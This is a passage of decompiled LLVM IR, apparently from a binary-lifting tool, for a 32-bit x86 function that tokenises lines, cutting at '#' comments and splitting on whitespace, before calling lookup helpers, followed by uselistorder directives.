  store i32 %arg8, i32* @eax, align 4
  %v0_8051a0f = load i32, i32* %edx.global-to-local, align 4
  %v2_8051a0f = inttoptr i32 %arg8 to i32*
  store i32 %v0_8051a0f, i32* %v2_8051a0f, align 4
  br label %dec_label_pc_8051b6d

dec_label_pc_8051a1e:                             ; preds = %dec_label_pc_80518f2
  store i8* null, i8** %stack_var_-44, align 4
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8051a3d

dec_label_pc_8051a3d:                             ; preds = %dec_label_pc_805196f, %dec_label_pc_8051a1e
  %v1_8051a41.pre-phi = phi i32* [ %v1_805190e, %dec_label_pc_805196f ], [ %.pre, %dec_label_pc_8051a1e ]
  %stack_var_-32.0 = phi i32 [ %v1_805193b, %dec_label_pc_805196f ], [ 0, %dec_label_pc_8051a1e ]
  %stack_var_-36.0 = phi i32 [ %v1_80518f2, %dec_label_pc_805196f ], [ 0, %dec_label_pc_8051a1e ]
  %stack_var_-40.0 = phi i32 [ %v0_805197a, %dec_label_pc_805196f ], [ 0, %dec_label_pc_8051a1e ]
  %stack_var_4.0 = phi i32 [ %v0_8051962, %dec_label_pc_805196f ], [ %arg1, %dec_label_pc_8051a1e ]
  %stack_var_-20.0 = phi i8* [ %v5_8051986, %dec_label_pc_805196f ], [ %v5_80518f8, %dec_label_pc_8051a1e ]
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8051a41.pre-phi, align 4
  %v4_8051b59 = ptrtoint i8* %stack_var_-20.0 to i32
  %v2_8051af6 = inttoptr i32 %arg2 to i8*
  %v0_8051b53120127 = load i32, i32* @edx, align 4
  %v3_8051b5d121128 = call i32 @function_804c93c(i32 %v4_8051b59, i32 %stack_var_4.0, i32 %v0_8051b53120127)
  store i32 %v3_8051b5d121128, i32* @eax, align 4
  %v1_8051b65122129 = icmp eq i32 %v3_8051b5d121128, 0
  %v1_8051b67123130 = icmp eq i1 %v1_8051b65122129, false
  br i1 %v1_8051b67123130, label %dec_label_pc_8051a54.lr.ph.lr.ph, label %dec_label_pc_8051b6d

dec_label_pc_8051a54.lr.ph.lr.ph:                 ; preds = %dec_label_pc_8051a3d
  %v12_8051b2b = icmp eq i32 %arg3, 10
  %v12_8051b09 = icmp eq i32 %arg3, 2
  %v12_8051ad0 = icmp eq i32 %arg4, 2
  %v1_8051ad5 = icmp eq i1 %v12_8051ad0, false
  %v1_8051b0e = icmp eq i1 %v12_8051b09, false
  %v1_8051b30 = icmp eq i1 %v12_8051b2b, false
  br label %dec_label_pc_8051a54.lr.ph

dec_label_pc_8051a54.lr.ph:                       ; preds = %dec_label_pc_8051a54.lr.ph.lr.ph, %dec_label_pc_8051b53.outer.backedge
  %v3_8051b5d121132 = phi i32 [ %v3_8051b5d121128, %dec_label_pc_8051a54.lr.ph.lr.ph ], [ %v3_8051b5d121, %dec_label_pc_8051b53.outer.backedge ]
  %stack_var_-28.0.ph131 = phi i32 [ 1, %dec_label_pc_8051a54.lr.ph.lr.ph ], [ 2, %dec_label_pc_8051b53.outer.backedge ]
  br label %dec_label_pc_8051a54

dec_label_pc_8051a54:                             ; preds = %dec_label_pc_8051a54.lr.ph, %dec_label_pc_8051b53.backedge
  %v3_8051b5d124 = phi i32 [ %v3_8051b5d121132, %dec_label_pc_8051a54.lr.ph ], [ %v3_8051b5d, %dec_label_pc_8051b53.backedge ]
  %v5_8051a5c = call i32 @function_8051c54(i8* %stack_var_-20.0, i32 35, i32 %v3_8051b5d124, i32 %v3_8051b5d124)
  store i32 %v5_8051a5c, i32* @eax, align 4
  %v1_8051a64 = icmp eq i32 %v5_8051a5c, 0
  br i1 %v1_8051a64, label %dec_label_pc_8051a6b, label %dec_label_pc_8051a68

dec_label_pc_8051a68:                             ; preds = %dec_label_pc_8051a54
  %v1_8051a68 = inttoptr i32 %v5_8051a5c to i8*
  store i8 0, i8* %v1_8051a68, align 1
  br label %dec_label_pc_8051a6b

dec_label_pc_8051a6b:                             ; preds = %dec_label_pc_8051a54, %dec_label_pc_8051a68
  store i32 %v4_8051b59, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_8051aab32 = load i8, i8* %stack_var_-20.0, align 1
  %v3_8051aab33 = icmp eq i8 %v2_8051aab32, 0
  %v1_8051aae39 = icmp eq i1 %v3_8051aab33, false
  br i1 %v1_8051aae39, label %dec_label_pc_8051a77.preheader.preheader, label %dec_label_pc_8051ab0

dec_label_pc_8051a77.preheader.preheader:         ; preds = %dec_label_pc_8051a6b
  %v4_8051a7797.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051a77.preheader

dec_label_pc_8051a73:                             ; preds = %dec_label_pc_8051a7d
  store i8 0, i8* %v1_8051a77102, align 1
  %v0_8051a76 = load i32, i32* @ecx, align 4
  %v1_8051a76 = add i32 %v0_8051a76, 1
  store i32 %v1_8051a76, i32* @ecx, align 4
  %v1_8051a77 = inttoptr i32 %v1_8051a76 to i8*
  %v2_8051a77 = load i8, i8* %v1_8051a77, align 1
  %v3_8051a77 = zext i8 %v2_8051a77 to i32
  %v4_8051a77 = load i32, i32* %eax.global-to-local, align 4
  %v5_8051a77 = and i32 %v4_8051a77, -256
  %v6_8051a77 = or i32 %v5_8051a77, %v3_8051a77
  store i32 %v6_8051a77, i32* @eax, align 4
  %v4_8051a79 = icmp eq i8 %v2_8051a77, 0
  br i1 %v4_8051a79, label %dec_label_pc_8051a77.dec_label_pc_8051ab0.loopexit_crit_edge, label %dec_label_pc_8051a7d

dec_label_pc_8051a7d:                             ; preds = %dec_label_pc_8051a77.preheader, %dec_label_pc_8051a73
  %v2_8051a77103 = phi i8 [ %v2_8051a77, %dec_label_pc_8051a73 ], [ %v2_8051a7795, %dec_label_pc_8051a77.preheader ]
  %v1_8051a77102 = phi i8* [ %v1_8051a77, %dec_label_pc_8051a73 ], [ %v1_8051a7794, %dec_label_pc_8051a77.preheader ]
  %v0_8051a73101 = phi i32 [ %v1_8051a76, %dec_label_pc_8051a73 ], [ %v0_8051a7747, %dec_label_pc_8051a77.preheader ]
  %v2_8051a7d = sext i8 %v2_8051a77103 to i32
  store i32 %v2_8051a7d, i32* @edx, align 4
  %v0_8051a80 = load i32, i32* @global_var_80559e0, align 32
  store i32 %v0_8051a80, i32* %eax.global-to-local, align 4
  %v2_8051a85 = mul nsw i32 %v2_8051a7d, 2
  %v3_8051a85 = add i32 %v0_8051a80, %v2_8051a85
  %v4_8051a85 = inttoptr i32 %v3_8051a85 to i8*
  %v5_8051a85 = load i8, i8* %v4_8051a85, align 1
  %v6_8051a85 = and i8 %v5_8051a85, 32
  %v7_8051a85 = icmp eq i8 %v6_8051a85, 0
  %v1_8051a89 = icmp eq i1 %v7_8051a85, false
  br i1 %v1_8051a89, label %dec_label_pc_8051a73, label %dec_label_pc_8051a8b

dec_label_pc_8051a8b:                             ; preds = %dec_label_pc_8051a7d
  %v0_8051a8b = load i32, i32* @edi, align 4
  %v1_8051a8b = add i32 %v0_8051a8b, -6
  %v6_8051a8b = sub i32 5, %v0_8051a8b
  %v7_8051a8b = and i32 %v6_8051a8b, %v0_8051a8b
  %v8_8051a8b = icmp slt i32 %v7_8051a8b, 0
  %v9_8051a8b = icmp eq i32 %v1_8051a8b, 0
  %v10_8051a8b = icmp slt i32 %v1_8051a8b, 0
  %v3_8051a8e = icmp eq i1 %v10_8051a8b, %v8_8051a8b
  %v4_8051a8e = icmp eq i1 %v9_8051a8b, false
  %v5_8051a8e = and i1 %v4_8051a8e, %v3_8051a8e
  br i1 %v5_8051a8e, label %dec_label_pc_8051a97.preheader, label %dec_label_pc_8051a90

dec_label_pc_8051a90:                             ; preds = %dec_label_pc_8051a8b
  %v1_8051a90 = load i32, i32* @ebx, align 4
  %v3_8051a90 = mul i32 %v0_8051a8b, 4
  %v4_8051a90 = add i32 %v1_8051a90, %v3_8051a90
  %v5_8051a90 = inttoptr i32 %v4_8051a90 to i32*
  store i32 %v0_8051a73101, i32* %v5_8051a90, align 4
  %v0_8051a93 = load i32, i32* @edi, align 4
  %v1_8051a93 = add i32 %v0_8051a93, 1
  store i32 %v1_8051a93, i32* @edi, align 4
  %v0_8051a97.pre.pre = load i32, i32* @ecx, align 4
  %v4_8051a97.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051a97.preheader

dec_label_pc_8051a97.preheader:                   ; preds = %dec_label_pc_8051a90, %dec_label_pc_8051a8b
  %v4_8051a97.pre = phi i32 [ %v4_8051a97.pre.pre, %dec_label_pc_8051a90 ], [ %v0_8051a80, %dec_label_pc_8051a8b ]
  %v0_8051a97.pre = phi i32 [ %v0_8051a97.pre.pre, %dec_label_pc_8051a90 ], [ %v0_8051a73101, %dec_label_pc_8051a8b ]
  %v1_8051ab052 = phi i32 [ %v1_8051a93, %dec_label_pc_8051a90 ], [ %v0_8051a8b, %dec_label_pc_8051a8b ]
  %v1_8051a97104 = inttoptr i32 %v0_8051a97.pre to i8*
  %v2_8051a97105 = load i8, i8* %v1_8051a97104, align 1
  %v3_8051a97106 = zext i8 %v2_8051a97105 to i32
  %v5_8051a97107 = and i32 %v4_8051a97.pre, -256
  %v6_8051a97108 = or i32 %v3_8051a97106, %v5_8051a97107
  store i32 %v6_8051a97108, i32* @eax, align 4
  %v4_8051a99109 = icmp eq i8 %v2_8051a97105, 0
  br i1 %v4_8051a99109, label %dec_label_pc_8051aab.loopexit, label %dec_label_pc_8051a9d.lr.ph

dec_label_pc_8051a9d.lr.ph:                       ; preds = %dec_label_pc_8051a97.preheader
  %v0_8051aa0.pre = load i32, i32* @global_var_80559e0, align 32
  br label %dec_label_pc_8051a9d

dec_label_pc_8051a96:                             ; preds = %dec_label_pc_8051a9d
  %v1_8051a96 = add i32 %v0_8051aab110, 1
  store i32 %v1_8051a96, i32* @ecx, align 4
  %v1_8051a97 = inttoptr i32 %v1_8051a96 to i8*
  %v2_8051a97 = load i8, i8* %v1_8051a97, align 1
  %v3_8051a97 = zext i8 %v2_8051a97 to i32
  %v5_8051a97 = and i32 %v0_8051aa0.pre, -256
  %v6_8051a97 = or i32 %v3_8051a97, %v5_8051a97
  store i32 %v6_8051a97, i32* @eax, align 4
  %v4_8051a99 = icmp eq i8 %v2_8051a97, 0
  br i1 %v4_8051a99, label %dec_label_pc_8051aab.loopexit, label %dec_label_pc_8051a9d

dec_label_pc_8051a9d:                             ; preds = %dec_label_pc_8051a9d.lr.ph, %dec_label_pc_8051a96
  %v2_8051a97112 = phi i8 [ %v2_8051a97105, %dec_label_pc_8051a9d.lr.ph ], [ %v2_8051a97, %dec_label_pc_8051a96 ]
  %v1_8051a97111 = phi i8* [ %v1_8051a97104, %dec_label_pc_8051a9d.lr.ph ], [ %v1_8051a97, %dec_label_pc_8051a96 ]
  %v0_8051aab110 = phi i32 [ %v0_8051a97.pre, %dec_label_pc_8051a9d.lr.ph ], [ %v1_8051a96, %dec_label_pc_8051a96 ]
  %v2_8051a9d = sext i8 %v2_8051a97112 to i32
  store i32 %v2_8051a9d, i32* @edx, align 4
  store i32 %v0_8051aa0.pre, i32* @eax, align 4
  %v2_8051aa5 = mul nsw i32 %v2_8051a9d, 2
  %v3_8051aa5 = add i32 %v0_8051aa0.pre, %v2_8051aa5
  %v4_8051aa5 = inttoptr i32 %v3_8051aa5 to i8*
  %v5_8051aa5 = load i8, i8* %v4_8051aa5, align 1
  %v6_8051aa5 = and i8 %v5_8051aa5, 32
  %v7_8051aa5 = icmp eq i8 %v6_8051aa5, 0
  br i1 %v7_8051aa5, label %dec_label_pc_8051a96, label %dec_label_pc_8051aab.loopexit

dec_label_pc_8051aab.loopexit:                    ; preds = %dec_label_pc_8051a9d, %dec_label_pc_8051a96, %dec_label_pc_8051a97.preheader
  %v4_8051a7797144 = phi i32 [ %v6_8051a97108, %dec_label_pc_8051a97.preheader ], [ %v6_8051a97, %dec_label_pc_8051a96 ], [ %v0_8051aa0.pre, %dec_label_pc_8051a9d ]
  %v0_8051aab.lcssa = phi i32 [ %v0_8051a97.pre, %dec_label_pc_8051a97.preheader ], [ %v1_8051a96, %dec_label_pc_8051a96 ], [ %v0_8051aab110, %dec_label_pc_8051a9d ]
  %v1_8051a97.lcssa = phi i8* [ %v1_8051a97104, %dec_label_pc_8051a97.preheader ], [ %v1_8051a97, %dec_label_pc_8051a96 ], [ %v1_8051a97111, %dec_label_pc_8051a9d ]
  %v2_8051aab = load i8, i8* %v1_8051a97.lcssa, align 1
  %v3_8051aab = icmp eq i8 %v2_8051aab, 0
  %v1_8051aae = icmp eq i1 %v3_8051aab, false
  br i1 %v1_8051aae, label %dec_label_pc_8051a77.preheader, label %dec_label_pc_8051ab0

dec_label_pc_8051a77.preheader:                   ; preds = %dec_label_pc_8051a77.preheader.preheader, %dec_label_pc_8051aab.loopexit
  %v1_8051ab0.pre147 = phi i32 [ %v1_8051ab052, %dec_label_pc_8051aab.loopexit ], [ 0, %dec_label_pc_8051a77.preheader.preheader ]
  %v4_8051a7797 = phi i32 [ %v4_8051a7797144, %dec_label_pc_8051aab.loopexit ], [ %v4_8051a7797.pre, %dec_label_pc_8051a77.preheader.preheader ]
  %v0_8051a7747 = phi i32 [ %v0_8051aab.lcssa, %dec_label_pc_8051aab.loopexit ], [ %v4_8051b59, %dec_label_pc_8051a77.preheader.preheader ]
  %v1_8051a7794 = inttoptr i32 %v0_8051a7747 to i8*
  %v2_8051a7795 = load i8, i8* %v1_8051a7794, align 1
  %v3_8051a7796 = zext i8 %v2_8051a7795 to i32
  %v5_8051a7798 = and i32 %v4_8051a7797, -256
  %v6_8051a7799 = or i32 %v5_8051a7798, %v3_8051a7796
  store i32 %v6_8051a7799, i32* @eax, align 4
  %v4_8051a79100 = icmp eq i8 %v2_8051a7795, 0
  br i1 %v4_8051a79100, label %dec_label_pc_8051ab0, label %dec_label_pc_8051a7d

dec_label_pc_8051a77.dec_label_pc_8051ab0.loopexit_crit_edge: ; preds = %dec_label_pc_8051a73
  %v1_8051ab0.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051ab0

dec_label_pc_8051ab0:                             ; preds = %dec_label_pc_8051aab.loopexit, %dec_label_pc_8051a77.dec_label_pc_8051ab0.loopexit_crit_edge, %dec_label_pc_8051a77.preheader, %dec_label_pc_8051a6b
  %v1_8051ab0 = phi i32 [ 0, %dec_label_pc_8051a6b ], [ %v1_8051ab0.pre.pre, %dec_label_pc_8051a77.dec_label_pc_8051ab0.loopexit_crit_edge ], [ %v1_8051ab0.pre147, %dec_label_pc_8051a77.preheader ], [ %v1_8051ab052, %dec_label_pc_8051aab.loopexit ]
  %v0_8051ab0 = load i32, i32* @ebx, align 4
  %v2_8051ab0 = mul i32 %v1_8051ab0, 4
  %v3_8051ab0 = add i32 %v2_8051ab0, %v0_8051ab0
  %v4_8051ab0 = inttoptr i32 %v3_8051ab0 to i32*
  store i32 0, i32* %v4_8051ab0, align 4
  %v0_8051ab7 = load i32, i32* @edi, align 4
  %v7_8051aba = icmp sgt i32 %v0_8051ab7, 1
  br i1 %v7_8051aba, label %dec_label_pc_8051ac0, label %dec_label_pc_8051b53.backedge

dec_label_pc_8051ac0:                             ; preds = %dec_label_pc_8051ab0
  br i1 %v12_80518fc, label %dec_label_pc_8051b8d, label %dec_label_pc_8051acb

dec_label_pc_8051acb:                             ; preds = %dec_label_pc_8051ac0
  store i32 1, i32* @esi, align 4
  br i1 %v1_8051ad5, label %dec_label_pc_8051aed.lr.ph, label %dec_label_pc_8051ad7

dec_label_pc_8051aed.lr.ph:                       ; preds = %dec_label_pc_8051acb
  br label %dec_label_pc_8051aed

dec_label_pc_8051ad7:                             ; preds = %dec_label_pc_8051acb
  %v0_8051ad7 = load i32, i32* @eax, align 4
  %v0_8051ad9 = load i32, i32* @ebx, align 4
  %v1_8051ad9 = inttoptr i32 %v0_8051ad9 to i32*
  %v2_8051ad9 = load i32, i32* %v1_8051ad9, align 4
  %v5_8051adf = call i32 @function_8050fb4(i8* %v2_8051af6, i32 %v2_8051ad9, i32 %v0_8051ad7, i32 %v0_8051ad7)
  store i32 %v5_8051adf, i32* %eax.global-to-local, align 4
  %v1_8051ae7 = icmp eq i32 %v5_8051adf, 0
  %v1_8051ae9 = icmp eq i1 %v1_8051ae7, false
  br i1 %v1_8051ae9, label %dec_label_pc_8051b53.backedge, label %dec_label_pc_8051b09

dec_label_pc_8051b53.backedge:                    ; preds = %dec_label_pc_8051b02, %dec_label_pc_8051ad7, %dec_label_pc_8051ab0
  %v0_8051b53 = load i32, i32* @edx, align 4
  %v3_8051b5d = call i32 @function_804c93c(i32 %v4_8051b59, i32 %stack_var_4.0, i32 %v0_8051b53)
  store i32 %v3_8051b5d, i32* @eax, align 4
  %v1_8051b65 = icmp eq i32 %v3_8051b5d, 0
  %v1_8051b67 = icmp eq i1 %v1_8051b65, false
  br i1 %v1_8051b67, label %dec_label_pc_8051a54, label %dec_label_pc_8051b6d

dec_label_pc_8051aed:                             ; preds = %dec_label_pc_8051aed.lr.ph, %dec_label_pc_8051b02
  %v1_8051aef119 = phi i32 [ 1, %dec_label_pc_8051aed.lr.ph ], [ %v1_8051b02, %dec_label_pc_8051b02 ]
  %v0_8051aef = load i32, i32* @ebx, align 4
  %v2_8051aef = mul i32 %v1_8051aef119, 4
  %v3_8051aef = add i32 %v0_8051aef, %v2_8051aef
  %v4_8051aef = inttoptr i32 %v3_8051aef to i32*
  %v5_8051aef = load i32, i32* %v4_8051aef, align 4
  %v3_8051af6 = call i32 @function_804cfdc(i8* %v2_8051af6, i32 %v5_8051aef)
  store i32 %v3_8051af6, i32* %eax.global-to-local, align 4
  %v1_8051afe = icmp eq i32 %v3_8051af6, 0
  br i1 %v1_8051afe, label %dec_label_pc_8051b09, label %dec_label_pc_8051b02

dec_label_pc_8051b02:                             ; preds = %dec_label_pc_8051aed
  %v0_8051b02 = load i32, i32* @esi, align 4
  %v1_8051b02 = add i32 %v0_8051b02, 1
  store i32 %v1_8051b02, i32* @esi, align 4
  %v1_8051b03.pre = load i32, i32* @edi, align 4
  %v5_8051b05 = icmp slt i32 %v1_8051b02, %v1_8051b03.pre
  br i1 %v5_8051b05, label %dec_label_pc_8051aed, label %dec_label_pc_8051b53.backedge

dec_label_pc_8051b09:                             ; preds = %dec_label_pc_8051ad7, %dec_label_pc_8051aed
  br i1 %v1_8051b0e, label %dec_label_pc_8051b2b, label %dec_label_pc_8051b10

dec_label_pc_8051b10:                             ; preds = %dec_label_pc_8051b09
  %v0_8051b10 = load i32, i32* @esi, align 4
  %v3_8051b11 = load i8*, i8** %stack_var_-44, align 4
  %v4_8051b11 = ptrtoint i8* %v3_8051b11 to i32
  %v0_8051b15 = load i32, i32* @ebx, align 4
  %v1_8051b15 = inttoptr i32 %v0_8051b15 to i32*
  %v2_8051b15 = load i32, i32* %v1_8051b15, align 4
  %v4_8051b19 = inttoptr i32 %v2_8051b15 to i8*
  %v5_8051b19 = call i32 @function_8051122(i32 2, i8* %v4_8051b19, i32 %v4_8051b11, i32 %v0_8051b10)
  store i32 %v5_8051b19, i32* %eax.global-to-local, align 4
  %tmp84 = icmp slt i32 %v5_8051b19, 1
  %tmp85 = icmp eq i1 %tmp84, false
  br i1 %tmp85, label %dec_label_pc_80519a9, label %dec_label_pc_8051b53.outer.backedge

dec_label_pc_8051b53.outer.backedge:              ; preds = %dec_label_pc_8051b10, %dec_label_pc_8051b32, %dec_label_pc_8051b2b
  %v0_8051b53120 = load i32, i32* @edx, align 4
  %v3_8051b5d121 = call i32 @function_804c93c(i32 %v4_8051b59, i32 %stack_var_4.0, i32 %v0_8051b53120)
  store i32 %v3_8051b5d121, i32* @eax, align 4
  %v1_8051b65122 = icmp eq i32 %v3_8051b5d121, 0
  %v1_8051b67123 = icmp eq i1 %v1_8051b65122, false
  br i1 %v1_8051b67123, label %dec_label_pc_8051a54.lr.ph, label %dec_label_pc_8051b6d

dec_label_pc_8051b2b:                             ; preds = %dec_label_pc_8051b09
  br i1 %v1_8051b30, label %dec_label_pc_8051b53.outer.backedge, label %dec_label_pc_8051b32

dec_label_pc_8051b32:                             ; preds = %dec_label_pc_8051b2b
  %v0_8051b32 = load i32, i32* @ecx, align 4
  %v0_8051b37 = load i32, i32* @ebx, align 4
  %v1_8051b37 = inttoptr i32 %v0_8051b37 to i32*
  %v2_8051b37 = load i32, i32* %v1_8051b37, align 4
  %v4_8051b3b = inttoptr i32 %v2_8051b37 to i8*
  %v5_8051b3b = call i32 @function_8051122(i32 10, i8* %v4_8051b3b, i32 %stack_var_-36.0, i32 %v0_8051b32)
  store i32 %v5_8051b3b, i32* %eax.global-to-local, align 4
  %tmp86 = icmp slt i32 %v5_8051b3b, 1
  %tmp87 = icmp eq i1 %tmp86, false
  br i1 %tmp87, label %dec_label_pc_80519d6, label %dec_label_pc_8051b53.outer.backedge

dec_label_pc_8051b6d:                             ; preds = %dec_label_pc_8051b53.outer.backedge, %dec_label_pc_8051a3d, %dec_label_pc_8051b53.backedge, %dec_label_pc_8051a02
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_8051a02 ], [ 1, %dec_label_pc_8051a3d ], [ 2, %dec_label_pc_8051b53.outer.backedge ], [ %stack_var_-28.0.ph131, %dec_label_pc_8051b53.backedge ]
  br i1 %v12_80518fc, label %dec_label_pc_8051b8d, label %dec_label_pc_8051b74

dec_label_pc_8051b74:                             ; preds = %dec_label_pc_8051b6d
  %v1_8051b7b = inttoptr i32 %stack_var_4.0 to i16*
  %v2_8051b7b = call i32 @function_804b4c4(i16* %v1_8051b7b)
  store i32 %v2_8051b7b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051b8d

dec_label_pc_8051b8d:                             ; preds = %dec_label_pc_8051ac0, %dec_label_pc_80518dd, %dec_label_pc_80518e9, %dec_label_pc_8051907, %dec_label_pc_805191a, %dec_label_pc_8051926, %dec_label_pc_805192f, %dec_label_pc_8051959, %dec_label_pc_8051b6d, %dec_label_pc_8051b74, %dec_label_pc_805198f
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_8051b6d ], [ %stack_var_-28.1, %dec_label_pc_8051b74 ], [ %v2_805199e, %dec_label_pc_805198f ], [ 34, %dec_label_pc_8051959 ], [ 34, %dec_label_pc_805192f ], [ 34, %dec_label_pc_8051926 ], [ 34, %dec_label_pc_805191a ], [ 34, %dec_label_pc_8051907 ], [ 34, %dec_label_pc_80518e9 ], [ 34, %dec_label_pc_80518dd ], [ %stack_var_-28.0.ph131, %dec_label_pc_8051ac0 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_80518c8, i32* @ebx, align 4
  store i32 %v0_80518c7, i32* @esi, align 4
  store i32 %v0_80518c6, i32* @edi, align 4
  store i32 %v0_80518c5, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v3_8051b5d121, { 1, 2, 0 }
  uselistorder i32 %v1_8051b02, { 0, 2, 1 }
  uselistorder i32 %v3_8051b5d, { 1, 2, 0 }
  uselistorder i8 %v2_8051a7795, { 1, 2, 0 }
  uselistorder i8* %v1_8051a7794, { 1, 0 }
  uselistorder i32 %v0_8051a7747, { 1, 0 }
  uselistorder i32 %v2_8051a9d, { 1, 0 }
  uselistorder i32 %v1_8051a96, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8051aa0.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8051a8b, { 1, 0 }
  uselistorder i32 %v0_8051a8b, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8051a7d, { 1, 0 }
  uselistorder i32 %v3_8051b5d124, { 1, 0 }
  uselistorder i8* %v2_8051af6, { 1, 0 }
  uselistorder i32 %v4_8051b59, { 1, 4, 2, 3, 0 }
  uselistorder i32 %stack_var_4.0, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0 }
  uselistorder i32 %v0_805191a, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80518f5, { 1, 0 }
  uselistorder i32 %v1_80518d8, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 3, 2, 1, 0 }
  uselistorder i32 %tmp59, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12, 14, 13, 15 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 8, 9, 10, 11, 13, 12, 2, 3, 5, 6, 7, 14, 17, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32 34, { 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 9, 0, 1, 14, 15, 16 }
  uselistorder i32 (i16*)* @function_804b4c4, { 2, 3, 0, 1, 5, 4 }
  uselistorder i32 (i8*, i32)* @function_804cfdc, { 3, 0, 1, 2 }
  uselistorder i32 5, { 10, 12, 13, 14, 0, 9, 4, 5, 11, 6, 15, 16, 7, 1, 2, 17, 3, 8 }
  uselistorder i32 -6, { 1, 0 }
  uselistorder i8 32, { 8, 9, 10, 11, 12, 16, 0, 1, 7, 2, 13, 17, 18, 14, 15, 3, 4, 5, 6 }
  uselistorder i32* @global_var_80559e0, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 (i32, i32, i32)* @function_804c93c, { 1, 6, 0, 5, 2, 4, 3 }
  uselistorder i32 10, { 13, 1, 24, 25, 26, 27, 28, 29, 2, 18, 19, 21, 20, 3, 6, 30, 7, 32, 9, 8, 14, 4, 16, 17, 22, 10, 31, 15, 11, 0, 5, 23, 12 }
  uselistorder i32 12, { 37, 38, 39, 0, 40, 16, 26, 49, 54, 18, 17, 4, 41, 5, 6, 7, 8, 9, 10, 11, 50, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 102, 25, 27, 32, 53, 28, 29, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 19, 86, 42, 43, 44, 45, 103, 46, 98, 1, 2, 99, 100, 12, 13, 101, 3, 51, 52, 20, 24, 21, 22, 30, 31, 14, 15, 33, 34, 35, 36, 47, 48, 23 }
  uselistorder i32 80, { 0, 6, 7, 8, 9, 10, 11, 12, 2, 3, 5, 1, 4 }
  uselistorder i32 56, { 3, 14, 4, 5, 6, 7, 8, 1, 10, 9, 11, 2, 0, 15, 12, 13 }
  uselistorder i32 44, { 3, 4, 5, 1, 16, 17, 18, 6, 7, 0, 13, 15, 14, 10, 11, 12, 8, 9, 2 }
  uselistorder i32 36, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 13, 1, 2, 14, 15, 3, 16, 17, 18, 19 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 13, 12, 3, 9, 4, 14, 15, 0, 10, 6, 5, 1, 11, 7, 8, 16, 17, 18, 19, 2 }
  uselistorder i32 -48, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 16, { 48, 47, 5, 49, 50, 14, 2, 51, 15, 89, 99, 100, 52, 53, 54, 55, 56, 57, 64, 58, 59, 60, 61, 62, 63, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 90, 91, 92, 93, 101, 102, 103, 104, 105, 106, 107, 108, 123, 16, 17, 31, 18, 43, 26, 32, 40, 33, 127, 97, 7, 6, 98, 0, 8, 75, 76, 23, 3, 24, 9, 19, 128, 77, 78, 79, 80, 81, 82, 94, 95, 83, 84, 85, 86, 109, 110, 111, 112, 113, 114, 1, 115, 116, 117, 118, 119, 10, 120, 121, 27, 122, 124, 125, 126, 96, 4, 36, 28, 29, 34, 35, 37, 11, 38, 39, 12, 41, 13, 42, 20, 44, 45, 46, 21, 87, 22, 88, 30, 25 }
  uselistorder i32 8, { 68, 67, 69, 8, 9, 70, 71, 72, 73, 74, 75, 0, 76, 10, 7, 87, 88, 89, 37, 145, 39, 16, 17, 18, 19, 40, 20, 21, 22, 41, 23, 42, 24, 43, 44, 90, 146, 147, 148, 149, 150, 151, 38, 152, 153, 154, 173, 174, 175, 33, 180, 34, 181, 54, 35, 55, 25, 57, 62, 98, 58, 59, 99, 100, 101, 102, 103, 104, 105, 1, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 2, 116, 117, 118, 119, 120, 46, 3, 47, 4, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 45, 138, 139, 5, 140, 141, 142, 143, 6, 144, 77, 78, 11, 12, 36, 179, 79, 91, 92, 13, 14, 56, 155, 156, 157, 158, 160, 161, 162, 159, 163, 164, 165, 166, 26, 27, 167, 168, 169, 170, 171, 172, 15, 176, 177, 178, 93, 94, 95, 96, 60, 61, 97, 48, 49, 50, 28, 29, 51, 30, 63, 31, 52, 32, 64, 65, 66, 80, 81, 82, 83, 53, 84, 85, 86 }
  uselistorder i32 -32, { 3, 0, 1, 2 }
  uselistorder i32 32, { 33, 17, 34, 35, 16, 20, 29, 0, 1, 2, 3, 4, 5, 36, 25, 37, 38, 39, 23, 24, 44, 14, 58, 21, 28, 30, 31, 32, 15, 7, 6, 8, 9, 26, 10, 18, 40, 41, 42, 45, 46, 19, 47, 48, 49, 50, 51, 52, 53, 11, 54, 55, 27, 56, 57, 43, 22, 13, 12 }
